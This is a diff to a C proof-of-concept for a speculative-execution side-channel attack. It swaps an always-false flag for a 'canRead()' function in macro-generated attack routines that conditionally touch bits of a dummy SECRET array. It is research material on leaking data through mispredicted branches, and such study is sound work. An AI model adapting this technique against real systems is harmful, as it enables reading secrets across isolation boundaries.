@@ -21,10 +21,15 @@ static const uint64_t SECRET[32] = {
   0xe76b23a5fcd41890, 0x098cd65ab1723ef4, 0x10567def24a89cb3, 0xacacacacacacacac,
 };
 
-static volatile bool alwaysFalse = false;
-static volatile bool observer_exit = false;
+static volatile bool f = false;
+static bool canRead() {
+  return f;
+}
+
 static unsigned x;
 static unsigned r;
+
+static volatile bool observer_exit = false;
 
 // attack function for gcc (i.e. not clang/llvm)
 #if !defined(__clang__) && !defined(__llvm__)
@@ -51,7 +56,7 @@ static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t iters) { \
     if(*r_vol > 0) break; /* quit early if observer has already gotten something */ \
   } while(--iters > 0); \
  \
-  if(alwaysFalse) { \
+  if(canRead()) { \
     if(SECRET[bitnum/64] & (1ULL<<(bitnum & 63))) x = 2; \
   } else { \
     x = 2; \
@@ -83,7 +88,7 @@ static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t junk) { \
   /* Otherwise, clang won't eliminate the first store to x, regardless.         */ \
   EIGHT(EIGHT(__rdtsc();)) \
  \
-  if(alwaysFalse) { \
+  if(canRead()) { \
     if(SECRET[bitnum/64] & (1ULL<<(bitnum & 63))) x = 2; \
   } else { \
     x = 2; \
